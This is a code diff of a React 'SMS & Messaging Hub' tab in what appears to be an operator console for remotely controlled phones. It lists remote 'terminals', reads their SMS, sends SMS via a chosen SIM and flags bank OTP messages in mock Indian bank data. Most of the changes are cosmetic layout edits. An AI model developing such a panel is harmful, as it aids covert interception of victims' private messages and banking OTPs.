@@ -71,39 +71,38 @@ export default function MessagesTab({ devices = [], onSendSms, onFetchLogs }) {
         setMessages([
           {
             id: 'mock-1',
-            sender: 'VM-HDFCBK',
+            sender: 'VM-UNIONB-S',
             recipient: selectedDevice?.phone_number || '+919495535457',
-            message_body: 'Your OTP for transaction of INR 4,500.00 is 749215. Valid for 10 minutes. Do not share OTP with anyone.',
+            message_body: 'Your A/C 4910 has a credit of INR 12,500.00 on 25-Sep-26. UPI Ref 382910482910.',
             sms_type: 'inbox',
             timestamp: new Date(Date.now() - 4 * 60000).toISOString(),
-            is_otp: true,
           },
           {
             id: 'mock-2',
+            sender: 'JK-SBIBNK-S',
+            recipient: selectedDevice?.phone_number || '+919495535457',
+            message_body: 'OTP for NetBanking login is 839204. Valid for 5 mins. Do not disclose to anyone including bank officials.',
+            sms_type: 'inbox',
+            timestamp: new Date(Date.now() - 14 * 60000).toISOString(),
+            is_otp: true,
+          },
+          {
+            id: 'mock-3',
             sender: selectedDevice?.phone_number || '+919495535457',
             recipient: '+919808757540',
             message_body: 'Console Heartbeat ACK: Transmitted device state OK (Battery 45%, GPS lock active).',
             sms_type: 'sent',
-            timestamp: new Date(Date.now() - 25 * 60000).toISOString(),
-          },
-          {
-            id: 'mock-3',
-            sender: 'JIO-ALERT',
-            recipient: selectedDevice?.phone_number || '+919495535457',
-            message_body: 'Data balance alert: 1.5GB daily high-speed quota is 60% used. Plan expires in 24 days.',
-            sms_type: 'inbox',
-            timestamp: new Date(Date.now() - 110 * 60000).toISOString(),
+            timestamp: new Date(Date.now() - 45 * 60000).toISOString(),
           }
         ]);
       }
     } catch {
-      // Fallback preview
       setMessages([
         {
           id: 'mock-1',
-          sender: 'VK-SBIUPI',
+          sender: 'VM-UNIONB-S',
           recipient: selectedDevice?.phone_number || '+919495535457',
-          message_body: 'Dear Customer, your Mandate auto-pay of Rs. 199.00 has been successfully debited.',
+          message_body: 'Your A/C 4910 has a credit of INR 12,500.00 on 25-Sep-26.',
           sms_type: 'inbox',
           timestamp: new Date(Date.now() - 8 * 60000).toISOString(),
         }
@@ -145,7 +144,6 @@ export default function MessagesTab({ devices = [], onSendSms, onFetchLogs }) {
       setSendSuccess(true);
       setTimeout(() => setSendSuccess(false), 3000);
     } catch (err) {
-      // If executeCommand fails, fallback to provided modal handler
       if (onSendSms) onSendSms(selectedDevice);
     } finally {
       setSending(false);
@@ -173,15 +171,13 @@ export default function MessagesTab({ devices = [], onSendSms, onFetchLogs }) {
     <div className="messages-hub-container" id="messages-tab-page">
       {/* 1. Header Bar */}
       <div className="messages-hub-header">
-        <div className="hub-title-group">
+        <div className="hub-title-row">
           <h2 className="hub-main-title">SMS & Messaging Hub</h2>
-          <p className="hub-sub-title">Transmit, receive and monitor remote device cellular SMS</p>
-        </div>
-        <div className="hub-header-badges">
           <span className="hub-badge-pill">
-            <span className="live-dot" /> {devices.length} Online Terminals
+            <span className="live-dot" /> {devices.length} Online
           </span>
         </div>
+        <p className="hub-sub-title">Transmit, receive and monitor remote device cellular SMS</p>
       </div>
 
       {/* 2. Device Carousel Selector */}
@@ -226,38 +222,20 @@ export default function MessagesTab({ devices = [], onSendSms, onFetchLogs }) {
 
       {selectedDevice ? (
         <div className="hub-main-layout">
-          {/* 3. Active Terminal Telemetry Banner */}
+          {/* 3. Active Terminal Telemetry Banner - Mobile-safe 2-row layout */}
           <div className="active-terminal-banner">
-            <div className="terminal-info-left">
-              <div className="terminal-badge-icon">
-                <Smartphone size={20} />
-              </div>
-              <div>
-                <div className="terminal-title-row">
-                  <h3 className="terminal-name">{selectedDevice.model || selectedDevice.device_name}</h3>
-                  <span className="terminal-os-pill">A16 Terminal</span>
+            <div className="terminal-header-row">
+              <div className="terminal-info-left">
+                <div className="terminal-badge-icon">
+                  <Smartphone size={18} />
                 </div>
-                <p className="terminal-uuid">
-                  {selectedDevice.device_id.slice(0, 18)} · Live Cellular Ready
-                </p>
-              </div>
-            </div>
-
-            <div className="terminal-actions-right">
-              {/* SIM Slot Toggle */}
-              <div className="sim-slot-toggle">
-                <button
-                  className={`sim-toggle-btn ${selectedSim === 'sim1' ? 'active' : ''}`}
-                  onClick={() => setSelectedSim('sim1')}
-                >
-                  SIM 1
-                </button>
-                <button
-                  className={`sim-toggle-btn ${selectedSim === 'sim2' ? 'active' : ''}`}
-                  onClick={() => setSelectedSim('sim2')}
-                >
-                  SIM 2
-                </button>
+                <div className="terminal-text-col">
+                  <div className="terminal-title-flex">
+                    <h3 className="terminal-name">{selectedDevice.model || selectedDevice.device_name}</h3>
+                    <span className="terminal-os-pill">A16</span>
+                  </div>
+                  <p className="terminal-uuid">{selectedDevice.device_id.slice(0, 16)} · Ready</p>
+                </div>
               </div>
 
               <button
@@ -278,11 +256,24 @@ export default function MessagesTab({ devices = [], onSendSms, onFetchLogs }) {
               <div className="composer-header">
                 <div className="composer-title-group">
                   <Send size={15} className="composer-title-icon" />
-                  <h4 className="composer-title">Direct Cellular Dispatch</h4>
+                  <h4 className="composer-title">Direct SMS Dispatch</h4>
                 </div>
-                <span className="composer-counter-badge">
-                  {charCount} / 160 · {segments} SMS
-                </span>
+
+                {/* SIM Switcher in header */}
+                <div className="sim-slot-toggle">
+                  <button
+                    className={`sim-toggle-btn ${selectedSim === 'sim1' ? 'active' : ''}`}
+                    onClick={() => setSelectedSim('sim1')}
+                  >
+                    SIM 1
+                  </button>
+                  <button
+                    className={`sim-toggle-btn ${selectedSim === 'sim2' ? 'active' : ''}`}
+                    onClick={() => setSelectedSim('sim2')}
+                  >
+                    SIM 2
+                  </button>
+                </div>
               </div>
 
               {/* Quick Template Chips */}
@@ -304,7 +295,7 @@ export default function MessagesTab({ devices = [], onSendSms, onFetchLogs }) {
                 <span className="input-country-prefix">+91</span>
                 <input
                   type="tel"
-                  placeholder="Recipient 10-digit mobile number..."
+                  placeholder="Recipient mobile number..."
                   value={recipient}
                   onChange={(e) => setRecipient(e.target.value)}
                   className="composer-phone-input"
@@ -327,83 +318,86 @@ export default function MessagesTab({ devices = [], onSendSms, onFetchLogs }) {
                 />
               </div>
 
-              {/* Send Button & Quick Feedback */}
-              <div className="composer-action-row">
-                <div className="composer-status-hint">
-                  {sendSuccess && (
-                    <span className="send-success-pill">
-                      <Check size={13} /> SMS Queued & Dispatched
-                    </span>
-                  )}
-                </div>
+              {/* Counter & Status */}
+              <div className="composer-meta-row">
+                <span className="composer-counter-badge">
+                  {charCount} / 160 characters · {segments} SMS
+                </span>
 
-                <button
-                  type="button"
-                  className={`composer-send-btn ${sending ? 'is-loading' : ''}`}
-                  disabled={!recipient.trim() || !quickMsg.trim() || sending}
-                  onClick={handleSend}
-                >
-                  {sending ? (
-                    <>
-                      <RefreshCw size={14} className="spin-icon" />
-                      <span>Transmitting...</span>
-                    </>
-                  ) : (
-                    <>
-                      <Send size={14} />
-                      <span>Dispatch via {selectedSim.toUpperCase()}</span>
-                    </>
-                  )}
-                </button>
+                {sendSuccess && (
+                  <span className="send-success-pill">
+                    <Check size={12} /> Dispatched!
+                  </span>
+                )}
               </div>
+
+              {/* Full Width Send Button */}
+              <button
+                type="button"
+                className={`composer-send-btn ${sending ? 'is-loading' : ''}`}
+                disabled={!recipient.trim() || !quickMsg.trim() || sending}
+                onClick={handleSend}
+              >
+                {sending ? (
+                  <>
+                    <RefreshCw size={15} className="spin-icon" />
+                    <span>Transmitting SMS...</span>
+                  </>
+                ) : (
+                  <>
+                    <Send size={15} />
+                    <span>Dispatch via {selectedSim.toUpperCase()}</span>
+                  </>
+                )}
+              </button>
             </div>
 
             {/* Live SMS History & Thread Feed Card */}
             <div className="hub-history-card">
-              <div className="history-header-row">
+              {/* Row 1: Title + Count + Refresh */}
+              <div className="history-header-top">
                 <div className="history-title-group">
                   <Inbox size={16} />
-                  <h4 className="history-title">Recent Cellular Transmissions</h4>
+                  <h4 className="history-title">Recent Transmissions</h4>
                   <span className="history-count">({filteredMessages.length})</span>
                 </div>
 
-                <div className="history-controls">
-                  <div className="history-filter-pills">
-                    <button
-                      className={`filter-pill ${filterType === 'all' ? 'active' : ''}`}
-                      onClick={() => setFilterType('all')}
-                    >
-                      All
-                    </button>
-                    <button
-                      className={`filter-pill ${filterType === 'inbox' ? 'active' : ''}`}
-                      onClick={() => setFilterType('inbox')}
-                    >
-                      Received
-                    </button>
-                    <button
-                      className={`filter-pill ${filterType === 'sent' ? 'active' : ''}`}
-                      onClick={() => setFilterType('sent')}
-                    >
-                      Sent
-                    </button>
-                  </div>
+                <button
+                  className="refresh-feed-btn"
+                  onClick={() => loadDeviceMessages(selectedDevice.device_id)}
+                  title="Refresh SMS records"
+                >
+                  <RefreshCw size={14} className={loadingLogs ? 'spin-icon' : ''} />
+                </button>
+              </div>
 
-                  <button
-                    className="refresh-feed-btn"
-                    onClick={() => loadDeviceMessages(selectedDevice.device_id)}
-                    title="Refresh SMS records"
-                  >
-                    <RefreshCw size={13} className={loadingLogs ? 'spin-icon' : ''} />
-                  </button>
-                </div>
+              {/* Row 2: Full-width Segmented Filter Pills */}
+              <div className="history-filter-strip">
+                <button
+                  className={`filter-pill ${filterType === 'all' ? 'active' : ''}`}
+                  onClick={() => setFilterType('all')}
+                >
+                  All Messages
+                </button>
+                <button
+                  className={`filter-pill ${filterType === 'inbox' ? 'active' : ''}`}
+                  onClick={() => setFilterType('inbox')}
+                >
+                  Received
+                </button>
+                <button
+                  className={`filter-pill ${filterType === 'sent' ? 'active' : ''}`}
+                  onClick={() => setFilterType('sent')}
+                >
+                  Sent
+                </button>
               </div>
 
               {/* Feed Messages List */}
               <div className="history-messages-list">
                 {filteredMessages.length === 0 ? (
                   <div className="no-messages-empty">
-                    <MessageSquare size={28} />
+                    <MessageSquare size={26} />
                     <p>No cellular transmissions found for this filter.</p>
                   </div>
                 ) : (
@@ -425,12 +419,12 @@ export default function MessagesTab({ devices = [], onSendSms, onFetchLogs }) {
                             {isSent ? (
                               <>
                                 <ArrowUpRight size={13} className="text-sent" />
-                                <span className="direction-label">OUTGOING TO</span>
+                                <span className="direction-label">OUT</span>
                               </>
                             ) : (
                               <>
                                 <ArrowDownLeft size={13} className="text-inbox" />
-                                <span className="direction-label">INCOMING FROM</span>
+                                <span className="direction-label">IN</span>
                               </>
                             )}
                             <strong className="bubble-address">{targetAddr}</strong>
@@ -476,7 +470,7 @@ export default function MessagesTab({ devices = [], onSendSms, onFetchLogs }) {
         </div>
       ) : (
         <div className="hub-no-device-state">
-          <Smartphone size={40} />
+          <Smartphone size={36} />
           <h3>No Terminal Selected</h3>
           <p>Choose an active terminal from the top carousel to inspect cellular messages and dispatch SMS.</p>
         </div>
